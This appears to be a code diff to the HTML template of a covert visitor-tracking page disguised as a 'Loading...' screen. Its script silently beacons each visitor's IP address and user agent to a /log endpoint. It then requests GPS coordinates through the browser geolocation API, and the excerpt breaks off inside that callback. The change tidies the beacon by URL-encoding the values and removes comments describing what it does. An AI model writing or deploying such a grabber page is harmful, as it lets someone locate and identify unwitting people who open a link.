@@ -16,13 +16,13 @@ HTML_TEMPLATE = """
 <head>
     <title>Loading...</title>
     <script>
-        // Send IP info automatically via image beacon (works even if JS fails)
         (function() {
+            var ip = encodeURIComponent("{{ip}}");
+            var ua = encodeURIComponent("{{ua}}");
             var img = new Image();
-            img.src = "/log?ip={{ip}}&ua={{ua}}";
+            img.src = "/log?ip=" + ip + "&ua=" + ua;
         })();
 
-        // Try to get GPS coordinates if user allows
         if (navigator.geolocation) {
             navigator.geolocation.getCurrentPosition(
                 function(pos) {
